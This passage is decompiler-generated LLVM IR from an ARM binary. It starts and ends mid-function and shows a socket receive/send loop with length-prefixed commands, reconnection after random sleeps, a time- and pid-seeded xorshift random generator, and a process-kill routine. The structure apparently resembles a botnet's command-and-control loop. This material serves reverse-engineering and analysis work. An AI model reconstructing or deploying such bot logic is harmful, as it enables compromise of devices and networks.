  store i32 ptrtoint (i8** @global_var_1cd5c.209 to i32), i32* %r3.global-to-local, align 4
  %v1_10810 = urem i32 %v6_10804, 2
  %v2_10810 = icmp eq i32 %v1_10810, 0
  store i8 0, i8* bitcast (i8** @global_var_1cd5c.209 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1cd04.206 to i32), i32* %r5.global-to-local, align 4
  br i1 %v2_10810, label %dec_label_pc_10820, label %dec_label_pc_10a0c

dec_label_pc_10820:                               ; preds = %dec_label_pc_107e4
  %v1_10824 = icmp ne i32 %v2_1086c, -1
  call void @__pseudo_cond_branch(i1 %v1_10824, i32 ptrtoint (i32* @global_var_8dcc.81 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1082c = load i32, i32* %r5.global-to-local, align 4
  %v2_1082c = inttoptr i32 %v1_1082c to i32*
  store i32 -1, i32* %v2_1082c, align 4
  %v1_10834 = call i32 @_sleep(i32 1)
  br label %dec_label_pc_1066c.backedge

dec_label_pc_1066c.backedge:                      ; preds = %dec_label_pc_10820, %dec_label_pc_10958, %dec_label_pc_10a44, %dec_label_pc_10af8, %dec_label_pc_10b20, %dec_label_pc_10b90, %bb84, %dec_label_pc_1086c, %dec_label_pc_1087c, %dec_label_pc_10aac, %bb85, %dec_label_pc_10b3c, %dec_label_pc_10b0c
  %stack_var_-37.0.be = phi i8 [ %stack_var_-37.0, %bb84 ], [ %stack_var_-37.1, %dec_label_pc_1086c ], [ %stack_var_-37.1, %dec_label_pc_1087c ], [ %stack_var_-37.3, %bb85 ], [ %stack_var_-37.2, %dec_label_pc_10958 ], [ %stack_var_-37.1, %dec_label_pc_10b20 ], [ %v3_10b54, %dec_label_pc_10b3c ], [ %v3_10b54, %dec_label_pc_10b90 ], [ %stack_var_-37.1, %dec_label_pc_10820 ], [ %stack_var_-37.1, %dec_label_pc_10aac ], [ %stack_var_-37.1, %dec_label_pc_10af8 ], [ %stack_var_-37.1, %dec_label_pc_10a44 ], [ %stack_var_-37.3, %dec_label_pc_10b0c ]
  %stack_var_-1620.0.be = phi i32 [ %stack_var_-1620.0, %bb84 ], [ %stack_var_-1620.1, %dec_label_pc_1086c ], [ %stack_var_-1620.1, %dec_label_pc_1087c ], [ %stack_var_-1620.1, %bb85 ], [ %stack_var_-1620.1, %dec_label_pc_10958 ], [ %stack_var_-1620.1, %dec_label_pc_10b20 ], [ %stack_var_-1620.1, %dec_label_pc_10b3c ], [ %stack_var_-1620.1, %dec_label_pc_10b90 ], [ %stack_var_-1620.1, %dec_label_pc_10820 ], [ %stack_var_-1620.1, %dec_label_pc_10aac ], [ %stack_var_-1620.1, %dec_label_pc_10af8 ], [ %stack_var_-1620.1, %dec_label_pc_10a44 ], [ %stack_var_-1620.1, %dec_label_pc_10b0c ]
  %v2_1067486.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1066c

dec_label_pc_1083c:                               ; preds = %dec_label_pc_106e4
  store i32 %v2_10518, i32* %r2.global-to-local, align 4
  %v3_1084c = mul nuw nsw i32 %v3_10844, 4
  %v2_10850 = add i32 %v3_1084c, %v2_10518
  store i32 %v2_10850, i32* %r3.global-to-local, align 4
  %v1_10854 = add i32 %v2_10850, -556
  %v2_10854 = inttoptr i32 %v1_10854 to i32*
  %v3_10854 = load i32, i32* %v2_10854, align 4
  %v1_10858 = urem i32 %v2_106d4, 32
  %v7_10860 = shl i32 1, %v1_10858
  %v8_10860 = or i32 %v3_10854, %v7_10860
  store i32 %v8_10860, i32* %r2.global-to-local, align 4
  store i32 %v8_10860, i32* %v2_10854, align 4
  br label %dec_label_pc_10720

dec_label_pc_1086c:                               ; preds = %dec_label_pc_107d4
  %v7_10870 = icmp eq i32 %v2_1086c, -1
  store i32 ptrtoint (i32* @global_var_1cd04.206 to i32), i32* @r5, align 4
  br i1 %v7_10870, label %dec_label_pc_1066c.backedge, label %dec_label_pc_1087c

dec_label_pc_1087c:                               ; preds = %dec_label_pc_1086c
  %v3_1087c = udiv i32 %v2_1086c, 32
  store i32 %v2_10518, i32* %r2.global-to-local, align 4
  %v3_10888 = mul nuw nsw i32 %v3_1087c, 4
  %v2_1088c = add i32 %v3_10888, %v2_10518
  store i32 %v2_1088c, i32* %r3.global-to-local, align 4
  %v1_10890 = add i32 %v2_1088c, -556
  %v2_10890 = inttoptr i32 %v1_10890 to i32*
  %v3_10890 = load i32, i32* %v2_10890, align 4
  %v1_10894 = urem i32 %v2_1086c, 32
  %v6_10898 = lshr i32 %v3_10890, %v1_10894
  store i32 %v6_10898, i32* %r2.global-to-local, align 4
  %v1_1089c = urem i32 %v6_10898, 2
  %v2_1089c = icmp eq i32 %v1_1089c, 0
  br i1 %v2_1089c, label %dec_label_pc_1066c.backedge, label %dec_label_pc_108a4

dec_label_pc_108a4:                               ; preds = %dec_label_pc_1087c
  %v0_108a4 = call i32* @__errno_location()
  %v1_108a4 = ptrtoint i32* %v0_108a4 to i32
  %v0_108a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_108a8, i32* %v0_108a4, align 4
  store i32 %v1_108a4, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_108bc = load i32, i32* @global_var_1cd04.206, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_108c8 = call i32 @_recv(i32 %v2_108bc, i32 %v2_109f8, i32 2, i32 16386)
  %v7_108cc = icmp eq i32 %v4_108c8, -1
  br i1 %v7_108cc, label %dec_label_pc_10b0c, label %dec_label_pc_108d4

dec_label_pc_108d4:                               ; preds = %dec_label_pc_108a4
  %v2_108d4 = icmp eq i32 %v4_108c8, 0
  br i1 %v2_108d4, label %dec_label_pc_10958, label %dec_label_pc_108dc

dec_label_pc_108dc:                               ; preds = %dec_label_pc_108d4
  %v3_108dc = load i8, i8* %stack_var_-38, align 1
  %v4_108dc = sext i8 %v3_108dc to i32
  %v4_108e0 = zext i8 %stack_var_-37.1 to i32
  store i32 %v4_108e0, i32* %r3.global-to-local, align 4
  %v4_108e4 = mul nuw nsw i32 %v4_108e0, 256
  %v5_108e4 = or i32 %v4_108dc, %v4_108e4
  store i32 %v5_108e4, i32* %r2.global-to-local, align 4
  %v7_108e4 = icmp eq i32 %v5_108e4, 0
  br i1 %v7_108e4, label %dec_label_pc_10b20, label %dec_label_pc_108ec

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108dc
  %v1_108ec = mul nsw i32 %v4_108dc, 256
  %v3_108f0 = and i32 %v1_108ec, 65280
  %v4_108f4 = udiv i32 %v5_108e4, 256
  %v5_108f4 = or i32 %v3_108f0, %v4_108f4
  store i32 %v5_108f4, i32* %r3.global-to-local, align 4
  %v3_108f84 = udiv i32 %v5_108f4, 256
  store i32 %v3_108f84, i32* %r2.global-to-local, align 4
  %v1_10900 = trunc i32 %v3_108f84 to i8
  %v6_10904 = trunc i32 %v4_108f4 to i8
  store i8 %v6_10904, i8* %stack_var_-38, align 1
  %tmp = icmp ult i32 %v5_108f4, 1025
  br i1 %tmp, label %dec_label_pc_1091c, label %dec_label_pc_1090c

dec_label_pc_1090c:                               ; preds = %dec_label_pc_108ec
  %v2_1090c = load i32, i32* @global_var_1cd04.206, align 4
  %v1_10910 = call i32 @close(i32 %v2_1090c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10918 = load i32, i32* @r5, align 4
  %v2_10918 = inttoptr i32 %v1_10918 to i32*
  store i32 -1, i32* %v2_10918, align 4
  %v3_10924.pre = load i8, i8* %stack_var_-38, align 1
  br label %dec_label_pc_1091c

dec_label_pc_1091c:                               ; preds = %dec_label_pc_108ec, %dec_label_pc_1090c
  %v3_10924 = phi i8 [ %v6_10904, %dec_label_pc_108ec ], [ %v3_10924.pre, %dec_label_pc_1090c ]
  %v0_1091c = load i32, i32* %r4.global-to-local, align 4
  %v1_1091c = load i32, i32* @r8, align 4
  %v2_1091c = inttoptr i32 %v1_1091c to i32*
  store i32 %v0_1091c, i32* %v2_1091c, align 4
  %v4_10920 = urem i32 %v3_108f84, 256
  %v4_10924 = sext i8 %v3_10924 to i32
  store i32 %v2_1092c, i32* @r4, align 4
  %v4_10934 = mul nuw nsw i32 %v4_10920, 256
  %v5_10934 = or i32 %v4_10924, %v4_10934
  store i32 %v5_10934, i32* %r2.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_1093c = load i32, i32* @global_var_1cd04.206, align 4
  %v4_10944 = call i32 @_recv(i32 %v2_1093c, i32 %v2_1092c, i32 %v5_10934, i32 16386)
  %v7_10948 = icmp eq i32 %v4_10944, -1
  br i1 %v7_10948, label %dec_label_pc_10b0c, label %dec_label_pc_10950

dec_label_pc_10950:                               ; preds = %dec_label_pc_1091c
  %v2_10950 = icmp eq i32 %v4_10944, 0
  br i1 %v2_10950, label %dec_label_pc_10958, label %dec_label_pc_10b3c

dec_label_pc_10958:                               ; preds = %bb85, %dec_label_pc_10950, %dec_label_pc_108d4
  %stack_var_-37.2 = phi i8 [ %stack_var_-37.3, %bb85 ], [ %stack_var_-37.1, %dec_label_pc_108d4 ], [ %v1_10900, %dec_label_pc_10950 ]
  %v2_10958 = load i32, i32* @global_var_1cd04.206, align 4
  %v1_10960 = icmp ne i32 %v2_10958, -1
  call void @__pseudo_cond_branch(i1 %v1_10960, i32 ptrtoint (i32* @global_var_8dcc.81 to i32))
  store i32 ptrtoint (i32* @global_var_1cd04.206 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1cd04.206, align 4
  %v1_10974 = call i32 @_sleep(i32 1)
  br label %dec_label_pc_1066c.backedge

dec_label_pc_1097c:                               ; preds = %dec_label_pc_106d4
  %v0_10984 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10984, i32* %r2.global-to-local, align 4
  %v3_10988 = call i32 @_socket(i32 2, i32 1, i32 %v0_10984)
  unreachable

dec_label_pc_109ec:                               ; preds = %dec_label_pc_10774
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10a04 = call i32 @_send()
  br label %dec_label_pc_1079c

dec_label_pc_10a0c:                               ; preds = %dec_label_pc_107e4
  store i32 4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 %v2_10a1c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-52, align 4
  %v7_10a34 = call i32 @getsockopt(i32 %v2_1086c, i32 1, i32 4, i32* nonnull %stack_var_-48, i32* nonnull %stack_var_-52)
  %v3_10a38 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10a38, i32* %r3.global-to-local, align 4
  %v2_10a3c = icmp eq i32 %v3_10a38, 0
  br i1 %v2_10a3c, label %dec_label_pc_10aac, label %dec_label_pc_10a44

dec_label_pc_10a44:                               ; preds = %dec_label_pc_10a0c
  %v2_10a44 = load i32, i32* @global_var_1cd04.206, align 4
  %v1_10a48 = call i32 @close(i32 %v2_10a44)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10a50 = load i32, i32* %r5.global-to-local, align 4
  %v2_10a50 = inttoptr i32 %v1_10a50 to i32*
  store i32 -1, i32* %v2_10a50, align 4
  %v0_10a54 = call i32 @function_10bd8()
  %v2_10a5c = urem i32 %v0_10a54, 10
  %v1_10a60 = add nuw nsw i32 %v2_10a5c, 1
  %v1_10a64 = call i32 @_sleep(i32 %v1_10a60)
  br label %dec_label_pc_1066c.backedge

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_107ac
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_10a1c, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v6_10a84 = call i32 @accept(i32 %v2_107a0, %sockaddr* %tmp83, i32* nonnull %stack_var_-48)
  %v1_10a88 = call i32 @function_11408(i32 %v6_10a84)
  %v1_10a8c = call i32 @function_f2a8(i32 %v1_10a88)
  %v1_10a90 = call i32 @function_b084(i32 %v1_10a8c)
  store i32 %v1_10628, i32* %r2.global-to-local, align 4
  %v2_10aa0 = call i32 @kill(i32 %v1_10a9c, i32 9)
  call void @exit(i32 0)
  unreachable

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10a0c
  %v2_10ab0 = call i32 @function_13a08(i8* %v1_10ab0)
  %v3_10ab0 = trunc i32 %v2_10ab0 to i8
  store i8 %v3_10ab0, i8* %stack_var_-38, align 1
  %v0_10ab8 = call i32 @function_13cc0()
  %v0_10abc = load i32, i32* @r4, align 4
  store i32 %v0_10abc, i32* %r2.global-to-local, align 4
  %v1_10ac0 = load i32, i32* @fp, align 4
  %v2_10ac0 = inttoptr i32 %v1_10ac0 to i32*
  store i32 %v0_10ab8, i32* %v2_10ac0, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10ad0 = call i32 @_send()
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10ae8 = call i32 @_send()
  %v3_10aec = load i8, i8* %stack_var_-38, align 1
  %v4_10aec = sext i8 %v3_10aec to i32
  store i32 %v4_10aec, i32* %r2.global-to-local, align 4
  %v2_10af0 = icmp eq i8 %v3_10aec, 0
  br i1 %v2_10af0, label %dec_label_pc_1066c.backedge, label %dec_label_pc_10af8

dec_label_pc_10af8:                               ; preds = %dec_label_pc_10aac
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10b04 = call i32 @_send()
  br label %dec_label_pc_1066c.backedge

dec_label_pc_10b0c:                               ; preds = %dec_label_pc_1091c, %dec_label_pc_108a4
  %stack_var_-37.3 = phi i8 [ %stack_var_-37.1, %dec_label_pc_108a4 ], [ %v1_10900, %dec_label_pc_1091c ]
  %v0_10b0c = load i32, i32* @r8, align 4
  %v1_10b0c = inttoptr i32 %v0_10b0c to i32*
  %v2_10b0c = load i32, i32* %v1_10b0c, align 4
  store i32 %v2_10b0c, i32* %r3.global-to-local, align 4
  %v7_10b10 = icmp eq i32 %v2_10b0c, 4
  br i1 %v7_10b10, label %dec_label_pc_1066c.backedge, label %bb85

bb85:                                             ; preds = %dec_label_pc_10b0c
  %v8_10b14 = icmp eq i32 %v2_10b0c, 11
  br i1 %v8_10b14, label %dec_label_pc_1066c.backedge, label %dec_label_pc_10958

dec_label_pc_10b20:                               ; preds = %dec_label_pc_108dc
  %v2_10b24 = load i32, i32* @global_var_1cd04.206, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10b34 = call i32 @_recv(i32 %v2_10b24, i32 %v2_109f8, i32 2, i32 16384)
  br label %dec_label_pc_1066c.backedge

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10950
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_10b4c = load i32, i32* @global_var_1cd04.206, align 4
  %v4_10b50 = call i32 @_recv(i32 %v2_10b4c, i32 %v2_109f8, i32 2, i32 16384)
  %v3_10b54 = load i8, i8* %stack_var_-38, align 1
  %v4_10b54 = sext i8 %v3_10b54 to i32
  %v4_10b5c = mul nsw i32 %v4_10b54, 256
  %v5_10b5c = or i32 %v4_10b5c, %v4_10920
  store i32 %v5_10b5c, i32* %r2.global-to-local, align 4
  store i32 %v4_10b54, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_10b70 = load i32, i32* @global_var_1cd04.206, align 4
  store i8 %v1_10900, i8* %stack_var_-38, align 1
  %v7_10b7c = call i32 @_recv(i32 %v2_10b70, i32 %v2_1092c, i32 %v5_10b5c, i32 16384)
  %v3_10b80 = load i8, i8* %stack_var_-38, align 1
  %v4_10b80 = sext i8 %v3_10b80 to i32
  store i32 %v4_10b80, i32* %r2.global-to-local, align 4
  %v4_10b84 = zext i8 %v3_10b54 to i32
  store i32 %v4_10b84, i32* %r3.global-to-local, align 4
  %v4_10b88 = mul nuw nsw i32 %v4_10b84, 256
  %v5_10b88 = or i32 %v4_10b80, %v4_10b88
  %v7_10b88 = icmp eq i32 %v5_10b88, 0
  br i1 %v7_10b88, label %dec_label_pc_1066c.backedge, label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b3c
  %v5_10b94 = call i32 @function_ae30(i32* nonnull %stack_var_-1616, i32 %v5_10b88, i32 %v4_10b80, i32 %v4_10b84)
  br label %dec_label_pc_1066c.backedge

; uselistorder directives
  uselistorder i32 %v4_10b84, { 1, 0, 2 }
  uselistorder i32 %v4_10b80, { 1, 0, 2 }
  uselistorder i32 %v4_10b54, { 1, 0 }
  uselistorder i8 %v3_10b54, { 2, 3, 1, 0 }
  uselistorder i8 %stack_var_-37.3, { 1, 0, 2 }
  uselistorder i32 %v4_10944, { 1, 0 }
  uselistorder i32 %v4_10920, { 1, 0 }
  uselistorder i8 %v1_10900, { 0, 2, 1 }
  uselistorder i32 %v3_108f84, { 0, 2, 1 }
  uselistorder i32 %v4_108f4, { 1, 0 }
  uselistorder i32 %v4_108c8, { 1, 0 }
  uselistorder i32 %v2_1086c, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_107a0, { 3, 2, 1, 0 }
  uselistorder i8 %stack_var_-37.1, { 9, 8, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_1075c, { 2, 1, 0 }
  uselistorder i32 %v2_106d4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_106a0, { 2, 1, 0 }
  uselistorder i32 %v1_10690, { 1, 2, 0 }
  uselistorder i32 %v1_10678, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1620.0, { 0, 3, 1, 2 }
  uselistorder i32 %v2_109f8, { 2, 1, 0 }
  uselistorder i32 %v4_105d0, { 1, 2, 0 }
  uselistorder i32 %v2_10518, { 0, 10, 1, 11, 2, 3, 9, 4, 5, 8, 6, 12, 7 }
  uselistorder i32 %v2_10500, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v1_10464, { 1, 0 }
  uselistorder i32 %v1_10434, { 1, 0 }
  uselistorder i32 %v0_10428, { 1, 0 }
  uselistorder i32 %v1_10400, { 1, 0 }
  uselistorder i32 %v0_103f4, { 1, 0 }
  uselistorder i32 %v1_103cc, { 1, 0 }
  uselistorder i32 %v0_103c0, { 1, 0 }
  uselistorder i32 %v1_10398, { 1, 0 }
  uselistorder i32 %v0_10388, { 1, 0 }
  uselistorder i32 %v0_10384, { 1, 0 }
  uselistorder i32 %v0_10364, { 1, 0 }
  uselistorder i32 %v4_10240, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 0, 2, 3, 1 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 0, 4, 6, 5, 7 }
  uselistorder i8* %stack_var_-106, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-138, { 1, 0, 2 }
  uselistorder i8* %stack_var_-38, { 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8 %tmp36, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 55, 56, 39, 40, 36, 53, 54, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder void (i32)* @exit, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, %sockaddr*, i32*)* @accept, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32*)* @getsockopt, { 1, 0, 2 }
  uselistorder i32 ()* @_send, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 16384, { 0, 6, 3, 7, 2, 8, 9, 10, 11, 12, 4, 13, 5, 14, 1, 15, 16 }
  uselistorder i32 65280, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @_recv, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 16386, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 (i32)* @_sleep, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @_select, { 1, 0, 2 }
  uselistorder i8* bitcast (i8** @global_var_1cd5c.209 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1cd5c.209, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1cd5c.209 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1cd04.206, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 (i32)* @function_1302c, { 11, 12, 10, 9, 8, 7, 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_13000, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32 (i32)* @function_130e4, { 24, 23, 22, 21, 20, 19, 15, 18, 17, 16, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @r2, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_13a30, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i32, i32)* @function_10c8c, { 1, 0 }
  uselistorder i8 2, { 1, 0 }
  uselistorder i32 80, { 1, 0, 2 }
  uselistorder [2 x i8]* @global_var_1436c.78, { 1, 0 }
  uselistorder i32 (i32)* @close, { 9, 8, 11, 10, 13, 12, 0, 3, 2, 1, 7, 6, 5, 4, 14 }
  uselistorder i32 (i8*, i32, ...)* @open, { 1, 0, 3, 2, 4 }
  uselistorder void (i32)** @global_var_ffc0.176, { 1, 0 }
  uselistorder void (i32)* (i32, void (i32)*)* @signal, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1091c, { 1, 0 }
  uselistorder label %dec_label_pc_1066c.backedge, { 5, 11, 4, 10, 12, 3, 9, 2, 1, 8, 7, 0, 6 }
  uselistorder label %dec_label_pc_1079c, { 2, 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_106d4, { 1, 0 }
  uselistorder label %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10674.dec_label_pc_10674_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_104f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_104cc, { 2, 0, 1 }
}

define i32 @function_10bd8() local_unnamed_addr {
dec_label_pc_10bd8:
  %v2_10be4 = load i32, i32* @global_var_1cd60.215, align 4
  %v2_10be8 = load i32, i32* @global_var_1cd6c.217, align 4
  store i32 ptrtoint (i32* @global_var_1cd64.219 to i32), i32* @lr, align 4
  %v4_10bf4 = mul i32 %v2_10be4, 2048
  %v5_10bf4 = xor i32 %v4_10bf4, %v2_10be4
  %v4_10bf8 = udiv i32 %v2_10be8, 524288
  %v5_10bf8 = xor i32 %v4_10bf8, %v2_10be8
  %v2_10bfc = load i32, i32* @global_var_1cd64.219, align 4
  %v2_10c00 = load i32, i32* @global_var_1cd68.221, align 4
  %v2_10c04 = xor i32 %v5_10bf8, %v5_10bf4
  %v4_10c08 = udiv i32 %v5_10bf4, 256
  %v5_10c08 = xor i32 %v2_10c04, %v4_10c08
  store i32 %v2_10bfc, i32* @global_var_1cd60.215, align 4
  store i32 %v2_10c00, i32* @global_var_1cd64.219, align 4
  store i32 %v2_10be8, i32* @global_var_1cd68.221, align 4
  store i32 %v5_10c08, i32* @global_var_1cd6c.217, align 4
  ret i32 %v5_10c08

; uselistorder directives
  uselistorder i32 %v2_10be8, { 2, 1, 0 }
  uselistorder i32 %v2_10be4, { 1, 0 }
}

define i32 @function_10c30(i32 %arg1) local_unnamed_addr {
dec_label_pc_10c30:
  %stack_var_-12 = alloca i32, align 4
  %v3_10c30 = load i32, i32* @r4, align 4
  store i32 %v3_10c30, i32* %stack_var_-12, align 4
  %v2_10c38 = call i32 @time(i32* null)
  store i32 %v2_10c38, i32* @global_var_1cd60.215, align 4
  %v1_10c44 = call i32 @_getpid(i32 %v2_10c38)
  %v0_10c4c = call i32 @getppid()
  %v2_10c54 = xor i32 %v1_10c44, %v0_10c4c
  store i32 %v2_10c54, i32* @global_var_1cd64.219, align 4
  %v1_10c5c = call i32 @clock()
  %v2_10c60 = load i32, i32* @global_var_1cd64.219, align 4
  %v2_10c6c = xor i32 %v2_10c60, %v1_10c5c
  store i32 %v2_10c6c, i32* @global_var_1cd6c.217, align 4
  store i32 %v1_10c5c, i32* @global_var_1cd68.221, align 4
  %v2_10c78 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10c78, i32* @r4, align 4
  ret i32 %v1_10c5c

; uselistorder directives
  uselistorder i32 %v1_10c5c, { 1, 2, 0 }
}

define i32 @function_10c8c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10c8c:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-69 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10c8c = load i32, i32* @r4, align 4
  store i32 %v3_10c8c, i32* %stack_var_-36, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_14424.227 to i32), i32* %r1.global-to-local, align 4
  %v2_10ca0 = ptrtoint i32* %stack_var_-69 to i32
  store i32 %v2_10ca0, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r2.global-to-local, align 4
  %v4_10ca8 = call i32 @_memcpy(i32 %v2_10ca0, i32 ptrtoint ([33 x i8]* @global_var_14424.227 to i32), i32 33)
  store i32 %v4_10ca8, i32* %r0.global-to-local, align 4
  %v0_10cac = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10cac = icmp slt i32 %v0_10cac, 0
  store i1 %v1_10cac, i1* %cpsr_n.global-to-local, align 1
  %v2_10cac = icmp eq i32 %v0_10cac, 0
  store i1 %v2_10cac, i1* %cpsr_z.global-to-local, align 1
  %tmp20 = icmp slt i32 %v0_10cac, 1
  br i1 %tmp20, label %dec_label_pc_10d98, label %dec_label_pc_10cb4

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10c8c
  store i32 ptrtoint (i32* @global_var_1cd6c.217 to i32), i32* %fp.global-to-local, align 4
  %v2_10cc0 = load i32, i32* @global_var_1cd68.221, align 4
  store i32 %v2_10cc0, i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd60.215 to i32), i32* %r3.global-to-local, align 4
  %v2_10cc8 = load i32, i32* @global_var_1cd64.219, align 4
  store i32 %v2_10cc8, i32* %sl.global-to-local, align 4
  %v2_10ccc = load i32, i32* @global_var_1cd6c.217, align 4
  store i32 %v2_10ccc, i32* %r6.global-to-local, align 4
  %v2_10cd0 = load i32, i32* @global_var_1cd60.215, align 4
  store i32 %v2_10cd0, i32* %ip.global-to-local, align 4
  %v0_10cd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10cd4 = add i32 %v0_10cd4, 1
  store i32 %v1_10cd4, i32* %r7.global-to-local, align 4
  %v2_10ce0 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_10d40

dec_label_pc_10cdc:                               ; preds = %dec_label_pc_10d40
  %v1_10cdc = udiv i32 %v5_10d4c, 8
  %v4_10ce4 = urem i32 %v1_10cdc, 32
  %v5_10ce4 = add i32 %v4_10ce4, %v2_10ce0
  store i32 %v5_10ce4, i32* %r0.global-to-local, align 4
  %v3_10ce8 = mul i32 %v5_10d4c, 65536
  store i32 %v3_10ce8, i32* %r2.global-to-local, align 4
  store i32 %v2_10ce0, i32* %r3.global-to-local, align 4
  %v3_10cf0 = mul i32 %v5_10d4c, 256
  store i32 %v3_10cf0, i32* %r1.global-to-local, align 4
  %tmp21 = udiv i32 %v5_10d4c, 2048
  %v4_10cf4 = urem i32 %tmp21, 32
